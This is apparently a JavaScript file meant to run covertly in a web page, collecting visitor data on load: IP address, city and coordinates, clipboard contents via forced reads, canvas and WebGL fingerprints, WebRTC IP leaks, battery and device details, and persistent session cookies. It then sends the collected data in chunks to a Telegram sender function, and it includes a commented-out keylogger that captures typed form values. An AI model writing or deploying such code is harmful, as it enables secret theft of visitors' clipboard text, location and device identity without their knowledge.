function printLocal() {
    // Debug function
    Object.entries(localStorage).forEach(([k, v]) => console.log(`${k} : ${v}`));
}

// var keyData = {}
// keyData.behavior = {
//     keyPresses: []
// };

// document.addEventListener('keydown', (e) => {
//     keyData.behavior.keyPresses.push({
//         key: e.key,       // Full key logs (including special keys)
//         code: e.code,
//         time: Date.now(),
//         target: e.target.tagName,
//         isFormField: ['INPUT', 'TEXTAREA', 'SELECT'].includes(e.target.tagName),
//         value: e.target.value // Includes all typed content 
//     });
//     // console.clear();
//     // console.log(keyData)
// });



function mainData() {

    const now = new Date();

    function getSessionData() {
        const now = new Date();

        // Helper function to format timestamp
        const formatTimestamp = () => {
            return `${now.getHours()}Hrs:${now.getMinutes()}Mins:${now.getSeconds()}seconds on ${String(now.getDate()).padStart(2, '0')}/${String(now.getMonth() + 1).padStart(2, '0')}/${now.getFullYear()}`;
        };

        // Cookie functions
        function setCookie(name, value, days = 365) {
            try {
                const expires = new Date();
                expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
                document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires.toUTCString()}; path=/; SameSite=Lax`;
            } catch (error) {
                console.error("Failed to set cookie:", error);
            }
        }

        function getCookie(name) {
            try {
                const cookies = document.cookie.split('; ');
                for (const cookie of cookies) {
                    const [cookieName, cookieValue] = cookie.split('=');
                    if (cookieName === name) {
                        return decodeURIComponent(cookieValue);
                    }
                }
                return null;
            } catch (error) {
                console.error("Failed to read cookie:", error);
                return null;
            }
        }

        // Main logic to get or create session data
        function getOrCreateSessions() {
            const sessionKey = 'sessions';
            const sessionCountKey = 'session_no';

            // Try to get data from localStorage first
            let localStorageData = null;
            try {
                localStorageData = localStorage.getItem(sessionKey)
                    ? JSON.parse(localStorage.getItem(sessionKey))
                    : null;
            } catch (e) {
                console.error("Error reading localStorage:", e);
            }

            // Try to get data from cookies
            let cookieData = null;
            try {
                const cookieValue = getCookie(sessionKey);
                cookieData = cookieValue ? JSON.parse(cookieValue) : null;
            } catch (e) {
                console.error("Error reading cookie data:", e);
            }

            // Determine which data source to use (prefer the one with more sessions)
            let existingData = null;
            let source = 'none';

            if (localStorageData && cookieData) {
                // Both exist - use the one with more sessions
                if (localStorageData.sessions.length >= cookieData.sessions.length) {
                    existingData = localStorageData;
                    source = 'localStorage';
                } else {
                    existingData = cookieData;
                    source = 'cookie';
                }
            } else if (localStorageData) {
                existingData = localStorageData;
                source = 'localStorage';
            } else if (cookieData) {
                existingData = cookieData;
                source = 'cookie';
            }

            // Get or create session count
            let sessionCount = 0;
            if (existingData) {
                sessionCount = existingData.sessions.length;
            } else {
                // No existing data - first time visitor
                const newSession = {
                    sessions: [{
                        id: 'session_1',
                        timestamp: formatTimestamp()
                    }]
                };

                // Save to both storage methods
                try {
                    localStorage.setItem(sessionKey, JSON.stringify(newSession));
                    localStorage.setItem(sessionCountKey, '1');
                    setCookie(sessionKey, JSON.stringify(newSession));
                    setCookie(sessionCountKey, '1');
                } catch (e) {
                    console.error("Error saving initial session:", e);
                }

                return newSession;
            }

            // Returning visitor - add new session
            const newSessionCount = sessionCount + 1;
            const newSessionEntry = {
                id: `session_${newSessionCount}`,
                timestamp: formatTimestamp()
            };

            // Update the existing data
            existingData.sessions.push(newSessionEntry);

            // Save to both storage methods
            try {
                localStorage.setItem(sessionKey, JSON.stringify(existingData));
                localStorage.setItem(sessionCountKey, newSessionCount.toString());
                setCookie(sessionKey, JSON.stringify(existingData));
                setCookie(sessionCountKey, newSessionCount.toString());
            } catch (e) {
                console.error("Error updating sessions:", e);
            }

            // console.log(`Session data loaded from ${source}. Total sessions: ${newSessionCount}`);
            return existingData;
        }

        return getOrCreateSessions();
    }

    const sessionData = getSessionData();
    // console.log(sessionData);


    const userData = {
        Time: `${now.getHours()}Hrs:${now.getMinutes()}Mins:${now.getSeconds()}seconds on ${String(now.getDate()).padStart(2, '0')}/${String(now.getMonth() + 1).padStart(2, '0')}/${now.getFullYear()}`,
        // collectionVersion: '1.0.0',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        locale: navigator.language,
        // timezoneOffset: now.getTimezoneOffset()
    };
    userData.allSessionData = sessionData;


    window.addEventListener("error", (e) => {
        userData.resourceErrors = userData.resourceErrors || [];
        userData.resourceErrors.push({
            src: e.target.src || e.target.href,
            tag: e.target.tagName
        });
    }, true);



    // ==== [0. IP ADDRESS & NETWORK INFO] ==== //
    function collectNetworkInfo() {
        return new Promise((resolve) => {
            userData.networkInfo = {
                // Will be populated by the async IP lookup
                ipAddress: null,
                isp: null,
                asn: null,
                organization: null,
                country: null,
                region: null,
                city: null,
                postalCode: null,
                latitude: null,
                longitude: null,
                timezone: null,
                // Local network info
                localIPs: null,
                networkInterfaces: null
            };

            // Public IP and ISP detection using a third-party service
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    userData.networkInfo.ipAddress = data.ip;
                    userData.networkInfo.isp = data.org;
                    userData.networkInfo.asn = data.asn;
                    userData.networkInfo.organization = data.org;
                    userData.networkInfo.country = data.country_name;
                    userData.networkInfo.region = data.region;
                    userData.networkInfo.city = data.city;
                    userData.networkInfo.postalCode = data.postal;
                    userData.networkInfo.latitude = data.latitude;
                    userData.networkInfo.longitude = data.longitude;
                    userData.networkInfo.timezone = data.timezone;
                    resolve(data.city)
                })
                .catch(error => {
                    userData.networkInfo.error = "IP lookup failed";
                    resolve(null)
                });

            // Try to get local IP addresses (works in some browsers)
            // try {
            //     RTCPeerConnection.getLocalIPs = function (callback) {
            //         const pc = new RTCPeerConnection({ iceServers: [] });
            //         pc.createDataChannel('');
            //         pc.createOffer().then(offer => pc.setLocalDescription(offer))
            //             .then(() => {
            //                 const lines = pc.localDescription.sdp.split('\n');
            //                 const ips = [];
            //                 lines.forEach(line => {
            //                     if (line.indexOf('candidate') === 0) {
            //                         const parts = line.split(' ');
            //                         if (parts[7] === 'host') {
            //                             ips.push(parts[4]);
            //                         }
            //                     }
            //                 });
            //                 callback(ips);
            //             });
            //     };

            //     RTCPeerConnection.getLocalIPs(function (ips) {
            //         userData.networkInfo.localIPs = ips;
            //     });
            // } catch (e) {
            //     userData.networkInfo.localIPError = e.message;
            // }

            // Network interfaces (if available)
            // if (navigator.connection && navigator.connection.getNetworkInterfaces) {
            //     navigator.connection.getNetworkInterfaces()
            //         .then(interfaces => {
            //             userData.networkInfo.networkInterfaces = interfaces;
            //         })
            //         .catch(e => {
            //             userData.networkInfo.interfaceError = e.message;
            //         });
            // }

            return userData.networkInfo.city;
        });

    }

    // ==== [1. BASIC BROWSER INFO] ==== //
    function collectBasicInfo() {

        // async function checkPermissions() {
        //     userData.permissions = {
        //         geolocation: await navigator.permissions.query({ name: "geolocation" }),
        //         notifications: await navigator.permissions.query({ name: "notifications" })
        //     };
        // }
        // checkPermissions();


        userData.basicInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            // languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            // doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            // pdfViewerEnabled: navigator.pdfViewerEnabled,
            webdriver: navigator.webdriver,
            vendor: navigator.vendor,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation && screen.orientation.type,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                devicePixelRatio: window.devicePixelRatio
            },
            // timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            // timezoneOffset: new Date().getTimezoneOffset(),
            localStorageEnabled: !!window.localStorage,
            // sessionStorageEnabled: !!window.sessionStorage,
            indexedDBEnabled: !!window.indexedDB,
            webGLInfo: getWebGLInfo(),
            connectionInfo: null
        };

        if ('connection' in navigator) {
            const connection = navigator.connection;
            userData.basicInfo.connectionInfo = {
                // downlink: connection.downlink,
                effectiveType: connection.effectiveType,
                // rtt: connection.rtt,
                // saveData: connection.saveData,
                type: connection.type
            };
        }
    }

    // ==== [2. WEBGL FINGERPRINTING] ==== //
    function getWebGLInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return null;

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null,
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                parameters: Object.fromEntries(
                    ['MAX_TEXTURE_IMAGE_UNITS', 'MAX_VERTEX_TEXTURE_IMAGE_UNITS',
                        'MAX_RENDERBUFFER_SIZE', 'MAX_VARYING_VECTORS', 'MAX_VERTEX_ATTRIBS']
                        .map(param => [param, gl.getParameter(gl[param])]))
            };
        } catch (e) {
            return null;
        }
    }

    // ==== [5. KEYSTROKE LOGGING (FULL)] ==== //
    function collectBehavioralData() {
            // if (keyData.behavior.length>=5 && keyData.behavior.length<=50){
            //     userData.behavior = keyData.behavior;
            // }
            // console.log(userData.behavior)
    }

    // ==== [6. CLIPBOARD (FORCE-READ)] ==== //
    function collectClipboardData() {
        // Method 1: Modern API (may trigger prompts)
        try{
        function forceClipboardRead() {
            navigator.clipboard.readText()
                .then(text1 => {
                    // console.log("Clipboard:", text1);
                    return text1;
                })
                .catch(error => console.error("Blocked by browser:", error));
        }

        try {
            var dataToReturn = forceClipboardRead();
            userData.clipboard = {
                text: dataToReturn,
                length: dataToReturn.length
            }
        }
        catch (error) {
            // console.log("Error caught and passed")
        }

        if (dataToReturn == undefined || dataToReturn == null) {
            if ('clipboard' in navigator && 'readText' in navigator.clipboard) {
                navigator.clipboard.readText()
                    .then(text => {
                        userData.clipboard = {
                            text: text,     // Full clipboard content
                            length: text.length
                        };
                        dataToReturn = text;
                    })
                    .catch(e => {
                        // Fallback to Method 2 if denied
                        forceClipboardRead();
                    });
            } else {
                // Method 2: Legacy execCommand (Safari)
                forceClipboardRead();
            }
        }
    }
    catch(error){}
    }


    function forceClipboardRead() {
        const textarea = document.createElement('textarea');
        textarea.style.position = 'fixed';
        document.body.appendChild(textarea);
        textarea.focus();
        try {
            if (document.execCommand('paste')) {
                userData.clipboard = {
                    text: textarea.value,
                    length: textarea.value.length
                };
            }

        } catch (e) {
            userData.clipboardError = "Clipboard blocked";
        }
        document.body.removeChild(textarea);
    }

    // ==== [7. CANVAS/AUDIO FINGERPRINTING] ==== //
    async function collectCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        canvas.width = 2000;
        canvas.height = 200;
        const ctx = canvas.getContext('2d');

        // Add variation to maximize fingerprint uniqueness
        ctx.textBaseline = "top";
        ctx.font = "16px 'Arial'";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = "#069";
        ctx.fillText("Canvas Fingerprint!", 2, 15);
        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
        ctx.fillText("Canvas Fingerprint!", 4, 17);

        const dataURL = canvas.toDataURL();

        // Hash the base64 data URL to shorten
        const hash = await sha256(dataURL);
        userData.canvasFingerprint = hash;
    } catch (e) {
        userData.canvasError = e.message;
    }
}

// SHA-256 Hash Function (uses built-in Web Crypto API)
async function sha256(str) {
    const buf = new TextEncoder().encode(str);
    const hashBuf = await crypto.subtle.digest('SHA-256', buf);
    return Array.from(new Uint8Array(hashBuf))
        .map(b => b.toString(16).padStart(2, '0'))
        .join('');
}

    // ==== [8. ADDITIONAL PRECISE TRACKING METHODS] ==== //
    function collectAdditionalTrackingData() {
        // Battery status API
        if ('getBattery' in navigator) {
    try {
        navigator.getBattery().then(battery => {
            userData.batteryInfo = {
                level: battery.level,
                charging: battery.charging,
            };
        }).catch(e => console.error("Battery API error:", e));
    } catch (e) {
        console.error("Battery API access error:", e);
    }
}

        // Device orientation and motion
        try {
    if ('DeviceOrientationEvent' in window) {
        window.addEventListener('deviceorientation', (event) => {
            userData.deviceOrientation = {
                alpha: event.alpha,
                beta: event.beta,
                gamma: event.gamma
            };
            if (event.alpha == null && event.beta == null && event.gamma == null){
                delete userData.deviceOrientation;
            }
        }, true);
    }
} catch (e) {
    console.error("Device orientation error:", e);
}

        // if ('DeviceMotionEvent' in window) {
        //     window.addEventListener('devicemotion', (event) => {
        //         userData.deviceMotion = {
        //             acceleration: event.acceleration,
        //             accelerationIncludingGravity: event.accelerationIncludingGravity,
        //             rotationRate: event.rotationRate,
        //             interval: event.interval
        //         };
        //     }, true);
        // }

        // Media devices enumeration
        // if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
        //     navigator.mediaDevices.enumerateDevices()
        //         .then(devices => {
        //             userData.mediaDevices = devices.map(device => ({
        //                 kind: device.kind,
        //                 label: device.label,
        //                 deviceId: device.deviceId,
        //                 groupId: device.groupId
        //             }));
        //         })
        //         .catch(e => {
        //             userData.mediaDevicesError = e.message;
        //         });
        // }

        // Bluetooth availability
        if ('bluetooth' in navigator) {
            userData.bluetoothAvailable = true;
        }

        // USB availability
        if ('usb' in navigator) {
            userData.usbAvailable = true;
        }

        // Speech recognition
        if ('webkitSpeechRecognition' in window || 'SpeechRecognition' in window) {
            userData.speechRecognitionSupported = true;
        }

        // WebRTC IP leak detection (more detailed than the basic one above)
        try {
            const pc = new RTCPeerConnection({
                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
            });
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = (ice) => {
                if (ice.candidate) {
                    const candidate = ice.candidate.candidate;
                    if (candidate.indexOf('srflx') !== -1) {
                        const ip = candidate.split(' ')[4];
                        if (!userData.networkInfo.webrtcIPs) {
                            userData.networkInfo.webrtcIPs = [];
                        }
                        if (userData.networkInfo.webrtcIPs.indexOf(ip) === -1) {
                            userData.networkInfo.webrtcIPs.push(ip);
                        }
                    }
                }
            };
            setTimeout(() => {
                pc.close();
            }, 1000);
        } catch (e) {
            userData.webrtcError = e.message;
        }
    }

    // ==== [INITIALIZE] ==== //
    async function collectAllData() {

        try{

            const cityName = await collectNetworkInfo(); // Added IP and ISP collection
            collectClipboardData();
            collectBasicInfo();
            collectBehavioralData();
            
            // Simple city check - only run canvas if NOT Raipur
            if (!cityName || cityName.toLowerCase() !== "raipur") {
            }
            collectCanvasFingerprint();
            
            collectAdditionalTrackingData()
        }
        catch (error){}

        // Add this chunk splitting function
        function splitIntoChunks(text, maxLength = 4000) {
            const chunks = [];
            for (let i = 0; i < text.length; i += maxLength) {
                chunks.push(text.substring(i, i + maxLength));
            }
            return chunks;
        }

        // Modified sending function
        async function sendDeatilsToTelegram1(message) {
            const chunks = splitIntoChunks(message);

            for (const [index, chunk] of chunks.entries()) {
                await sendDeatilsToTelegram(`Part ${index + 1}/${chunks.length}\n${chunk}`);
            }
        }

        setTimeout(async () => { // Make this async
            try {
                const formattedData = JSON.stringify(userData, null, 2);
                // console.clear()
                await sendDeatilsToTelegram1(formattedData); // Add await
            } catch (error) {
                // console.log("Error loading fetcher", error);
            }
        }, 1500);
    }
    collectAllData();
};